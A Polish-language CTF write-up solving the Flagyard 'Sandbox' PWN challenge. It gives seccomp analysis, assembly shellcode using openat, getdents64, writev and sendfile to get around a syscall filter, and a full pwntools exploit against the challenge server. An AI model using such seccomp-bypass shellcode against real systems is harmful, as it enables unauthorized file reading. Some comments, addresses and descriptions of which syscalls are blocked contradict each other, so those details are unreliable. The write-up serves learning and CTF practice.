---
title: "Flagyard - Sandbox"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
  - CTF
tags:
  - Hacking
  - Walkthrough
  - CTF
  - Flagyard
  - PWN
header:
  overlay_image: /assets/images/pasek-hack.png
---
# Flagyard - Sandbox
{: .text-justify}

## Metainfo

|:----|:----|
|Portal:|[Flagyard](https://flagyard.com/)|
|Task:|[Sandbox](https://flagyard.com/labs/training-labs/13/challenges/9118fff4-f580-453f-b86d-7d1c1752c6b1)|
|Category:|PWN|

## Wstęp
Następny artykuł po polsku i następny PWN z FlagYar? A jak - wersja angielska będzie [tutaj](https://mindcrafters.xyz/writeups/sandbox/). A co mnie skłoniło do opisania tego zacnego PWN-a? Jak zwykle nietypowosc skonstruowania zagadania. W niedzielę miałem skończyć zaległe PWN-y, ale [da1sy](https://mindcrafters.xyz/members/da1sy/) poprosił mnie, czy bym się nie przyjrzał temu taskowi, bo działa to u niego lokalnie, ale nie działa już zdalnie na serwerze. Zadanie jest proste. Odpalasz program, wrzucasz shellcode i masz flagę. Proste. Czyżby?
{: .text-justify}

## Opis techniczny
Po wykonaniu polecenia `checksec` w `pwndbg` okazuje się, że jedynym aktywnym zabezpieczeniem jest ochrona przed naruszeniem stosu.
{: .text-justify}
### Checksec 

```bash
pwndbg> checksec
File:     /ctf/flagyard/sbx
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
Wynik z programu `seccomp-tools` niestety pokazuje zagmatwaną logikę filtrów (BPF). Jednak po dokładniejszym przyjrzeniu się można zauważyć, że dozwolone są syscalle `read` i `openat`. Natomiast `write`, `open` oraz `execve` są blokowane. Inne, niewymienione w filtrze, syscalle również działają.
{: .text-justify}
```bash
$ seccomp-tools dump ./sbx 

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0003
 0002: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0004
 0003: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0005
 0004: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0006
 0005: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0007
 0006: 0x06 0x00 0x00 0x00000000  return KILL
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 ```
 
### Dekompilacja
Kod źródłowy dekompilujemy przy użyciu `Ghidra`. Jest bardzo prosty. Wystarczy, że na zapytaniu wrzucimy `shellcode`. Wywołania syscalli są jednak sprawdzane i przepuszczane tylko te dozwolone. Jeśli program natrafi na niedozwolony syscall, natychmiast zatrzymuje swoje działanie.
{: .text-justify}
```c

undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  read(0,local_118,0x99);
  setup();
  (*(code *)local_118)();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```
# Analiza
Co mogło pójść nie tak? Syscall `write`, `open` i `read` są blokowane. Jednak `sendfile` i `openat` pozostają dozwolone. Teoretycznie, powinniśmy być w stanie otworzyć plik `flag` za pomocą `openat`, a następnie przesłać go na `stdout` za pomocą `sendfile`. Co więcej, jest wystarczająco dużo miejsca na bufor na stosie. Proste? Niestety, nie do końca.
{: .text-justify}
Tak jak wspomniał [da1sy](https://mindcrafters.xyz/members/da1sy/), działa to lokalnie, ale nie działa zdalnie. Dlaczego? Prawdopodobnie plik `flag` ma inną nazwę. W związku z tym spróbowałem odczytać samego siebie, czyli plik `sbx`. To zadziałało zdalnie. Następnie sprawdziłem całą ścieżkę `/app/sbx`, co również działało poprawnie. To oznacza, że odczyt działa zdalnie. 
{: .text-justify}
Pozostało zidentyfikować nazwę pliku z flagą. Zapytałem ChatGPT, czy istnieje syscall umożliwiający odczytanie zawartości katalogu. Na szczęście wskazał `getdents64`. Miejsce na bufor umieściłem w sekcji `.bss`. Według `info file` w `pwndbg`, sekcja `.bss` miała tylko 8 wolnych bajtów:  
{: .text-justify}
```text
0x0000000000404048 - 0x0000000000404050
```
Jednak po sprawdzeniu vmmap okazało się, że dostępne jest dużo więcej miejsca – aż 0x1000 bajtów. To wystarczająco dużo na zawartość całego katalogu, nawet z metadanymi. Nie sądzę, żeby w katalogu było tysiąc plików.
{: .text-justify}
```bash
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /ctf/flagyard/sbx
          0x401000           0x402000 r-xp     1000   1000 /ctf/flagyard/sbx
          0x402000           0x403000 r--p     1000   2000 /ctf/flagyard/sbx
          0x403000           0x404000 r--p     1000   2000 /ctf/flagyard/sbx
          0x404000           0x405000 rw-p     1000   3000 /ctf/flagyard/sbx
    0x7ffff7da8000     0x7ffff7dab000 rw-p     3000      0 [anon_7ffff7da8]
```
## odczytanie pliku flag lokalnie
Ten shellcode działa lokalnie, jeżeli znamy nazwę pliku i jest ona `flag`.
{: .text-justify}
```asm
sh = """
mov rax, 0x67616c66 ;// flag
push rax
mov rdi, -100
mov rsi, rsp
xor edx, edx
xor r10, r10
push SYS_openat ;// SYS_openat
pop rax
syscall

mov rdi, 1
mov rsi, rax
push 0
mov rdx, rsp
mov r10, 0x100
push SYS_sendfile ;// SYS_sendfile
pop rax
syscall
```
Mała dygresja, komentarze w stylu `;` nie wystarczą, jeżeli kompiluemy shellcode w pythonie. Należy dodać jeszcze do tego `//`
{: .text-justify}

## odczytanie zawartosci katalogu
Poniżej znajduje się shellcode, który odczytuje zawartość katalogu i zapisuje ją do pamięci. W naszym przypadku dane trafiają do sekcji `.bss`.
{: .text-justify}
```asm
mov rdi, 1
mov rsi, 0x0000000000404248            ; // Adres danych z `getdents64`
mov rdx, 200                 ; // Liczba bajtów odczytanych z katalogu
mov rax, 20                 ; // SYS_writev
syscall
```
# Dalsza część problemu
Odczytanie zawartości katalogu do pamięci udało się, ale jak wyświetlić ją na ekranie? ChatGPT zaproponował kilka zaawansowanych rozwiązań, takich jak tworzenie potoków, przekierowanie za pomocą dup2, zamiana potoku, a następnie użycie syscall read. Jednak zdecydowałem się zrezygnować z tego podejścia.
Szukając innego rozwiązania, odwiedziłem (stronę)[https://x64.syscall.sh/] dotyczącą syscalli. Znalazłem `pwrite64`. Niestety, po głębszej analizie i sprawdzeniu kodów błędów okazało się, że `syscall` ten nie radzi sobie z `stdout`.
{: .text-justify}
# Nowy, lepszy(?) write
Zapytałem ChatGPT, czy syscall `writev` mógłby się nadać do rozwiązania problemu. Stwierdził, że bez problemu. Oczywiście, nie działało to od razu, ale wiedziałem, że `RAX` zwraca kod błędu, który trzeba zinterpretować. Okazało się, że `writev` inaczej odnosi się do adresu niż `write`. Należy podać adres wskaźnika oraz ilość danych do zapisania. Proste, prawda? (po fakcie).
Adresy wybrałem na oko, aby uniknąć nadpisania danych z katalogu, i wszystko zadziałało.
{: .text-justify}
```asm
mov  rax,0x0000000000404048
mov  [0x0000000000404448], rax ; // Zapis wskaźnika (adres danych) do adresu 0x404248
mov  rax,200
mov  [0x0000000000404450], rax ; // Zapis długości (200 bajtów w dziesiętnym) do adresu 0x404250
```
Udało się wypisać zawartość katalogu.
{: .text-justify}
# Nazwa pliku na stos
Problem z nazwami plików polega na tym, że mogą się zmieniać. Ręczne wrzucanie na stos po 8 bajtów, w odwrotnej kolejności, staje się nużące, zwłaszcza gdy trzeba to robić wiele razy. Dlatego napisałem mały programik, który automatyzuje ten proces i może się przydać w przyszłości.
{: .text-justify}
```python
def path_to_pushes(path):
    # Ensure the path ends with a null byte
    if not path.endswith("\x00"):
        path += "\x00"

    # Split the path into chunks of 8 bytes (64 bits) from the start
    chunks = []
    while path:
        chunk = path[:8]  # Take the first 8 bytes
        path = path[8:]  # Remove those bytes from the path

        # Convert the chunk to a little-endian 64-bit integer
        chunk_value = int.from_bytes(chunk.encode('latin1'), 'little')
        chunks.append((chunk, chunk_value))

    # Generate assembly code for the pushes in reverse order
    assembly_code = []
    for chunk, chunk_value in reversed(chunks):
        assembly_code.append(f"mov rax, 0x{chunk_value:016x} ; // {chunk}\npush rax")

    return "\n".join(assembly_code)

# Example usage
path = "/app/flag10f5c6c3f04aae26ca6b"
assembly = path_to_pushes(path)
print(assembly)
```
Wynik wygląda następująco. Wklejamy to na początek `shellcode`.
{: .text-justify}
```asm
mov rax, 0x0000006236616336 ; // 6ca6b
push rax
mov rax, 0x3265616134306633 ; // 3f04aae2
push rax
mov rax, 0x6336633566303167 ; // g10f5c6c
push rax
mov rax, 0x616c662f7070612f ; // /app/fla
push rax
```
Oczywiście można było, po odczytaniu nazwy flagi, zmodyfikować cały shellcode, ale szczerze mówiąc, już mi się tego nie chciało robić. I tak spędziłem nad tym 8 godzin.
{: .text-justify}
# Dwa Eksploity
{: .text-justify}
Na tym etapie pozostało napisać dwa `eksploity`. Pierwszy będzie odczytywał nazwę flagi, a drugi ją odczytywał. Nazwa flagi jest losowa i generuje się za każdym razem przy uruchomieniu instancji. Na szczęście pozostaje taka sama w obrębie tej samej instancji. 

Procedura wygląda następująco:  
1. Uruchamiamy program po raz pierwszy, aby uzyskać nazwę flagi.  
2. Modyfikujemy fragment exploita nr 1, wprowadzając odczytaną nazwę flagi.  
3. Uruchamiamy program ponownie z nowym ładunkiem i otrzymujemy flagę.
{: .text-justify}
# Pełny kod eksploita
```python
from pwn import *             

context.update(arch='x86_64', os='linux')
context.terminal = ['wt.exe','wsl.exe'] 

HOST="34.252.33.37:32232"
ADDRESS,PORT=HOST.split(":")

BINARY_NAME="./sbx"
binary = context.binary = ELF(BINARY_NAME, checksec=False)


if args.REMOTE:
    p = remote(ADDRESS,PORT)
else:
    p = process(binary.path)    

bss = 0x0000000000404048


first_payload= """

mov rax, 0x000000007070612f ; // /app
push rax

mov rdi, -100
mov rsi, rsp
xor edx, edx
xor r10, r10
mov rax,SYS_openat ;// SYS_openat
syscall

mov rdi, rax                  

mov rsi, 0x0000000000404048         ; // wskaźnik na bufor 
mov rdx, 200            ; // rozmiar bufora
mov rax, 217           ; // SYS_getdents64
syscall

mov  rax,0x0000000000404048
mov  [0x0000000000404448], rax ; // Zapis wskaźnika (adres danych) do adresu 0x404248
mov  rax,200
mov  [0x0000000000404450], rax ; // Zapis długości (40 bajtów w dziesiętnym) do adresu 0x404250

mov rdi, 1
mov rsi, 0x0000000000404248            ; // Adres danych z `getdents64`
mov rdx, 200                ; // Liczba bajtów odczytanych z katalogu
mov rax, 20                 ; // SYS_writev
syscall

"""

second_payload = """
mov rax, 0x0000006236616336 ; // 6ca6b
push rax
mov rax, 0x3265616134306633 ; // 3f04aae2
push rax
mov rax, 0x6336633566303167 ; // g10f5c6c
push rax
mov rax, 0x616c662f7070612f ; // /app/fla
push rax

mov rdi, -100
mov rsi, rsp
xor edx, edx
xor r10, r10
push SYS_openat ;// SYS_openat
pop rax
syscall

mov rdi, 1
mov rsi, rax
push 0
mov rdx, rsp
mov r10, 0x400
push SYS_sendfile ;// SYS_sendfile
pop rax
syscall

"""
# Analiza danych
def parse_data(data):
    # Przeszukaj dane, aby znaleźć sekcję z flagą
    flag = b"flag"
    start_idx = data.find(flag)  # Znajdź początek flagi
    if start_idx == -1:
        return "Flaga nie znaleziona"
    
    # Znajdź koniec flagi (zakładamy, że kończy się zerem)
    end_idx = data.find(b'\x00', start_idx)
    if end_idx == -1:
        return "Brak zakończenia flagi"
    
    # Wyciągnij flagę
    extracted_flag = data[start_idx:end_idx].decode()
    return extracted_flag

shell=asm(first_payload)
p.send(shell)
flag_path="/app/"+parse_data(p.recv())
info (f"Flag patch: {flag_path}")
p.close()

if args.REMOTE:
    p = remote(ADDRESS,PORT)

#---warning 
#--name of flag probabli will be different
shell=asm(second_payload)
p.send(shell)

p.interactive()
```
# Podsumowanie  
Cóż, kolejne świetne zadanie z FlagYard, którego zabawę wam odrobinę popsułem. 😉 Mam jednak nadzieję, że sięgniecie po tę solucję tylko wtedy, gdy naprawdę utkniecie. Próbowanie samemu to najlepszy sposób na naukę!
{: .text-justify}


